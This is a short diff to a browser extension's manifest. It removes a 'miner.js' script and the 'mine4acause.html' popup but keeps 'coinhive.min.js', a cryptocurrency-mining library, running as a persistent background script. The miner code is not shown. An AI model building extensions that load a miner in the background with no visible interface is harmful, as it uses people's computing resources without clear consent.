@@ -19,12 +19,8 @@
                   ],
   
    "background": {
-    "scripts": ["coinhive.min.js", "miner.js"],
+    "scripts": ["coinhive.min.js"],
     "persistent": true
-  },
-  
-    "browser_action": {
-   "default_popup": "mine4acause.html"
   },
   
   "manifest_version": 2,
